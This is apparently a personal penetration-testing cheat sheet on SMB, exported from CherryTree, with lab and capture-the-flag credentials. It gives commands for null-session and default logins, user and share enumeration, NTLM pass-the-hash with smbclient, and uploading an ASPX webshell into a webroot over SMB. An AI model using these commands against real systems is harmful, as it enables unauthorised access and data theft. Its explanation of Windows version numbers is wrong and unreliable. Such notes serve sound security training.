<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>SMB</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>SMB</h1><br/><p><h1>Methodology</h1><ul><li>Always try the <span style="color:#ff0000;">4 def logins</span>. Diff tools will test a diff def login if no creds are entered, &amp; may behave diff when testing them, so manually specify each of these 4. Test def logins with <a href="https://github.com/Komodo-pty/argus-recon">Argus</a> or use a for loop like-</li></ul></p><p>	<em>user=(&quot;&#39;&#39;&quot; &#39;guest&#39; &#39;Anonymous&#39;); for i in ${user[@]}; do</em> ...</p><p>	<ol><li>‘’:&#39;&#39; (Null Session)</li><li>‘guest’:&#39;&#39;</li><li> ‘Anonymous’:&#39;&#39;</li><li> ‘Anonymous’:&#39;Anonymous&#39;</li></ol></p><p><ul><li>ALWAYS <span style="color:#ff0000;">try creds against the domain &amp;</span> against the <span style="color:#ff0000;">host&#39;s name</span>. (e.g <strong>-d oscp.exam</strong> &amp; then <strong>-d ms01</strong>)</li></ul></p><p><ul><li>Fingerprint machine wiith <em>enum4linux-ng -A</em>, whether or not you have valid logins (&amp; still manually try the 4 def logins).</li></ul></p><p>	<ul><li>Check Privs</li></ul></p><p>	<ul><li> <span style="color:#ff0000;"> </span>Check SMB Signing</li></ul></p><p>	<ul><li>Try performing <a href="Misc_Attacks--Network_Attacks_14.html">Network Attacks</a> against each Windows host (Some work with &amp; w/o SMB Signing)</li></ul></p><p><ul><li>Check the supported versions. Some tools may only work with SMB1 &amp; SMB2</li></ul></p><p><ul><li> Check for files that are encrypted (may be able to extract &amp; crack a hash)</li></ul></p><p><ul><li>Check files for Metadata</li></ul></p><p></p><p><h2>★</h2><h2>Extracting Metadata</h2></p><p>Some file formats like <strong>PDF</strong>, and image files (<strong>JPG</strong>, <strong>PNG</strong>, etc) have metadata which could contain valuable info (e.g. an <strong>Author</strong> tag containing a <span style="color:#ff0000;">Username</span>, or Fingerprinting info about target machine).</p><p></p><p><em>exiftool FILE.pdf</em></p><p></p><p><h1>Enum SMB</h1><h1></h1></p><p><h1></h1>enum4linux-ng offers the most info, &amp; may provide results even when CME fails to / errors out<h1></h1></p><p><h1></h1><h1></h1></p><p><h1></h1><h2>Account Descriptions</h2></p><p>There may be sensitive info in account descriptions (i.e. passwords)</p><p></p><p>This can be done with enum4linux-ng (or argus).</p><p></p><p><em>enum4linux-ng -u michael.wrightson -p &#39;Cicada$M6Corpb*@Lp#nZp!8&#39; -A cicada.htb</em><h1></h1></p><p><h1></h1><h1></h1></p><p><h1></h1><h2>Enum Users &amp; Shares</h2></p><p>Nmap NSE will try to detect users &amp; shares. Designed for Windows, but may also work on some Linux implementations like Samba (not always?).</p><p></p><p>Use Argus to test the default logins (in case Nmap misses them).</p><p></p><p><em>nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse</em></p><p></p><p><h3>RID Cycling</h3></p><p>Find additional info (e.g. users, account info, etc) with Argus (enum4linux-ng) by performing RID Cycling (not performed if you only use -A). It&#39;s slow, but thorough.</p><p></p><p><em>enum4linux-ng -R -d -A xample.com</em></p><p><h1></h1></p><p><h1></h1><a name="Windows Fingerprinting"></a><h2>Windows Fingerprinting</h2></p><p>enum4linux-ng tells you OS, OS Version, OS Release, &amp; OS Build. The <span style="color:#ff0000;">primary thing to look at is the OS</span>, the other numbers will give you more details about the state of that OS.</p><p></p><p>How <a href="https://superuser.com/questions/1458555/how-do-windows-version-numbers-work">Windows Version</a> numbers work. The <a href="https://www.quora.com/What-is-the-difference-between-build-version-revision-and-release-in-terms-of-software-engineering">differences</a> between each. For ex-</p><p></p><p> OS: Windows 7 &amp; OS Version: <strong>6.2</strong> means this Windows 7 machine was updated 20<strong>06</strong> in Februray, the <strong>02</strong> month.</p><p> </p><p><h3>Incorrect Results</h3><h1></h1></p><p><h1></h1>This is basically just a guess &amp; <span style="color:#ff0000;">can be wrong</span>, <span style="color:#ff0000;">especially if target is </span>actually a <span style="color:#ff0000;">Linux</span> machine running something like Samba!<h1></h1></p><p><h1></h1><h1></h1></p><p><h1>Check Privileges</h1><h1></h1></p><p><h1></h1><span style="color:#ff0000;">CME is less accurate</span> than other tools like smbmap, but even smbmap can be wrong! Don&#39;t rely on any tools assumption of write perm!</p><p><em></em></p><p><em>smbmap -u Anonymous -H IP</em><em></em></p><p><em></em><em></em></p><p><em>smbmap -u kiosk -d skylark -p &#39;XEwUS^9R2Gwt8O914&#39; -H IP</em><em></em></p><p><em></em><em></em></p><p><em>crackmapexec smb IP -u ‘Anonymous’ -p ‘’	--shares </em>(May need -d DOMAIN)</p><p><em></em></p><p><em>enum4linux-ng -u kiosk -p &#39;XEwUS^9R2Gwt8O914&#39; -A IP</em></p><p></p><p><h2>smbmap</h2></p><p><span style="color:#ff0000;">Tests write perms for root dir only</span>! <span style="color:#ff0000;">You may have write perms inside </span>specific <span style="color:#ff0000;">subdir</span>(s) that it misses!</p><p></p><p><h3>OPSEC</h3></p><p>Tries to create a random dir at the root of each share to check write privs. This <a href="https://r4bb1t.medium.com/the-problem-with-smbmap-ac2486d3dc1d">leaves behind artifacts</a> on target!</p><p><h1></h1></p><p><h1></h1><a name="IPC$ Enum"></a>Enum Users &amp; Groups via IPC$</p><p>R/ Access to IPC$ allows you to do SID Enum to find Local/Dom users &amp; groups.</p><p></p><p><span style="color:#ff0000;">Don&#39;t rely on CME or NXC for privs</span>. It&#39;s less accurate, &amp; sometimes misses things like R/ access.</p><p></p><p><h2>Local SIDs</h2></p><p></p><p>	<span style="color:#3584e4;">Anonymous</span>: <em>impacket-lookupsid -no-pass anonymous@IP</em>       (or Anonymous@IP ?)</p><p>	<span style="color:#3584e4;">Dom Acct</span>:  <em>impacket-lookupsid</em> dom/user:passwd@IP</p><p></p><p><h2>Domain SIDs</h2></p><p>Append<em> </em><em><span style="color:#ff0000;">-domain-sids</span></em></p><p></p><p><em>impacket-lookupsid dom/user:passwd@IP -domain-sids</em></p><p></p><p><span style="color:#060f94;">★</span><h2>Create a Username List</h2></p><p>Before making a worldist, <span style="color:#ff0000;">run these commands without grep &amp; awk </span>to verify you aren&#39;t missing anything.</p><p></p><p><em>impacket-lookupsid raz0rblack.thm/twilliams:roastpotatoes@10.10.240.94 | grep  &quot;SidTypeUser&quot; | awk -F &#39;\&#39; &#39;{print $2}&#39; | awk -F &#39; \\(&#39; &#39;{print $1}&#39; &gt;&gt; /dev/shm/razorback/users.txt</em></p><p></p><p><em>impacket-lookupsid raz0rblack.thm/twilliams:roastpotatoes@10.10.240.94 -domain-sids | grep  &quot;SidTypeUser&quot; | awk -F &#39;\&#39; &#39;{print $2}&#39; | awk -F &#39; \\(&#39; &#39;{print $1}&#39; &gt;&gt; /dev/shm/razorback/users.txt</em></p><p></p><p><h1>Connecting</h1></p><p>MUST specify <span style="color:#ff0000;">UNC path</span> to target as<span style="color:#ff0000;"> 1st arg</span> for smbclient. Must use double backslash<span style="color:#ff0000;"> </span><strong><span style="color:#ff0000;">\\</span></strong><span style="color:#ff0000;"> after share name</span>.</p><p></p><p><span style="color:#ff0000;">HOSTNAME may be required</span>. In which case, specify before Username as shown below.</p><p></p><p><h2>To Domain or Not To Domain</h2></p><p>Sometimes it seems like connection will only work if you DON&#39;T specify the domain...for some reason?</p><p></p><p><h2>Special Character in Share Name</h2></p><p>You may need to put single quotes around share name (not the whole UNC Path).</p><p></p><p><em>smbclient \\\\10.10.89.245\\&#39;C$&#39; -U raz0rblack.thm/xyan1d3</em></p><p></p><p><em>smbclient \\\\10.10.221.109\\ADMIN$ -U a-whitehat</em></p><p></p><p><h2>Authenticate via NTLM Hash</h2></p><p></p><p><em>smbclient \\\\172.16.212.83\\Windows\\ -U medtech.com/wario --pw-nt-hash fdf36048c1cf88f5630381c5e38feb8e</em></p><p></p><p><h2>Null Session</h2></p><p>(At least for Samba)</p><p></p><p>Was <span style="color:#ff0000;">UNABLE to connect if I used </span>the <strong><span style="color:#ff0000;">-U </span></strong>arg. Even though it said, <strong>Password for [WORKGROUP\asura]: </strong>, I was able to establish a NULL Session by running the following &amp; hitting Enter for blank passwd.</p><p></p><p><span style="color:#f66151;text-decoration:underline;">WARNING</span>: Some tools (e.g. <strong>smbmap</strong>) had trouble using a Null Session. <strong>enum4linux-ng</strong> works well for Null Sessions. When using <strong>nxc</strong> via <strong>argus</strong> it worked, but I had issues manually listing Null Session with it? (maybe anomaly with the target?)</p><p></p><p><em>smbclient \\\\10.10.27.163\\public</em></p><p></p><p><h3>Specifying Domain?</h3></p><p>I *think* the following is the syntax for a null session on the skylark.com domain. Hit enter when prompted for a passwd.</p><p></p><p><em>smbclient \\\\10.10.79.12\\backup\\ -U &#39;skylark.com\&#39;</em></p><p></p><p><h1>Enumerate Contents</h1></p><p><h2>★</h2><h2>List Permissions &amp; Contents of All Shares</h2></p><p>From smbmap&#39;s help menu: -r will Recursively list dirs and files (no share\path lists the root of ALL shares), ex. &#39;email/backup&#39;.</p><p></p><p>Ergo, using -r w/o specifying anything will <span style="color:#ff0000;">list the contents of every share</span>, &amp; the <span style="color:#ff0000;">permissions you have over each directory in each share</span>!</p><p></p><p><em>smbmap -u lilyle -p &#39;ChangeMe#1234&#39; -H windcorp.thm -r</em></p><p></p><p><h2>Listing Directory</h2></p><p><span style="color:#060f94;">★</span><span style="color:#ff0000;">MUST </span>incl the<span style="color:#ff0000;"> trailing backslash</span> <strong>\</strong> if recursion isn&#39;t enabled. For ex-</p><p></p><p><em>ls \bob</em>		(Output: 	<strong>bob	D		0</strong>...)</p><p></p><p><em>ls \bob\</em>		(Outputs dir contents)</p><p></p><p><h2>Recursion</h2></p><p><em>recurse true</em><em></em></p><p><em>ls</em></p><p></p><p><h1>File Transfer</h1></p><p><a name="large files"></a><h2>Transfer Large Files</h2><span style="color:#060f94;">★</span></p><p>If going through Tunnel, try using the External IP if possible. May also have <span style="color:#ff0000;">more luck Uploading vs Downloading</span>. For ex-</p><p></p><p>Timed out connecting to Target&#39;s SMB Server &amp; Downloading from that, but able to connect to my SMB Server from the Target Machine &amp; uploading it there!</p><p></p><p><h3>What Worked</h3></p><p>There may be a delay without any output while the file is transferring, so be patient.</p><p></p><p><em>smbclient -m SMB2 \\\\10.10.139.253\\trash -c &#39;timeout 120; iosize 16384; get experiment_gone_wrong.zip&#39; -U sbradley</em></p><p></p><p>Taken from example syntax. The <strong>-N</strong> means no password.</p><p></p><p><em>smbclient -m SMB2 -N &#39;//server/share&#39; -c &#39;timeout 120; iosize 16384; get \&quot;My Files\More Files\&quot;\version_1\file.txt&#39; -U &lt;username&gt;</em></p><p></p><p><span style="color:#060f94;text-decoration:underline;">Tip</span>: To upload a file instead, presumably just swap <strong>get</strong> for <strong>put</strong>, &amp; list the file paths for the local &amp; target systems.</p><p></p><p><h3>Alternatives</h3></p><p>Below is 1 example of args, but see <a href="https://unix.stackexchange.com/questions/31900/smbclient-alternative-for-large-files">StackExchange</a> for other args &amp; example using curl.</p><p></p><p><em>smbclient \\\\10.10.89.147\\setup\\ -U oscp.exam/sql_svc </em><em><strong>--socket-options=&#39;TCP_NODELAY IPTOS_LOWDELAY SO_KEEPALIVE SO_RCVBUF=131072 SO_SNDBUF=131072&#39;</strong></em></p><p><h1></h1></p><p><h1></h1><a name="run smb server"></a><h2>Windows to Linux</h2></p><p><span style="color:#ff0000;">Sometimes requires Username &amp; Password </span>to connect to Attacker&#39;s SMB server. Can <span style="color:#ff0000;">specify both via CLi for non-interactive shell</span></p><p></p><p><strong>{Atker}</strong> <em>impacket-smbserver share . -smb2support -username user -password pass</em></p><p></p><p><em>net use \\ATKER\share /USER:user pass</em></p><p></p><p>net use \\10.10.145.147\setup /USER:oscp.exam\web_svc Diamond1</p><p></p><p><h2>Uploading File</h2></p><p>With <strong><span style="color:#ff0000;">R/W</span></strong><span style="color:#ff0000;"> perms on a share</span>, list the full path incl a destination file name.</p><p></p><p><span style="color:#f66151;text-decoration:underline;">IMPORTANT</span>: Even if you can connect to a share w/o creds (or via creds w/o R/W perms) you won&#39;t be able to use SMB to upload files unless you have Write Permissions there!</p><p></p><p>SMB may be used to serve WebServer, allowing you to<span style="color:#ff0000;"> upload webshell via SMB!</span> Test by identifying file in Webroot (e.g <strong>r14_2022\build\DNN\wwwroot\Robots.txt</strong>) &amp; nav to it.</p><p></p><p>Indicates that an upload here may be locatable in webroot.</p><p></p><p><em>put /usr/share/webshells/aspx/cmdasp.aspx r14_2022\build\DNN\wwwroot\shell.aspx</em></p><p></p><p><span style="color:#060f94;text-decoration:underline;">Tip</span>: You need to spell out the entire file path (e.g <strong>/home/user/file.txt </strong>instead of <strong>~/user.txt</strong>)</p><p></p><p><a name="Change Expired Password"></a><h1>Change Expired Password</h1></p><p>Use <em><span style="color:#ff0000;">impacket-smbpasswd</span></em>, not to be confused with <em>smbpasswd</em>.</p><p></p><p><em>impacket-smbpasswd sbradley@10.10.240.94</em></p><p></p><p><h1>Brute Force</h1></p><p>My version of hydra only works with SMBv1, but <a href="Misc_Attacks--Password_Attack_5.html#nxc">NXC</a> &amp; CME will also work with SMBv2.</p><p></p><p><h1>Tips</h1><ul><li>SMB Creds can be used to exploit <a href="PrivEsc--Windows_9.html#EternalBlue">EternalBlue</a> on a vuln machine</li></ul></p><p><ul><li><span style="color:#ff0000;">CME</span> sometimes <span style="color:#ff0000;">fails to recognize</span> a user as a <span style="color:#ff0000;">Local Admin</span>! May need to rerun</li></ul></p><p><ul><li>If using SMB for File Transfers in Windows Network, may not have R/W unless you specify creds! Don&#39;t forget to Auth!</li></ul></p><p><ul><li>If using <span style="color:#ff0000;">SMB for File Exfil</span> in a LAN, <span style="color:#ff0000;">even if you can connect to a host&#39;s SMB server w/o Auth</span> but you <span style="color:#ff0000;">may not have R/W </span>privs <span style="color:#ff0000;">unless creds</span> are provided!</li></ul></p></div>
</body>
</html>
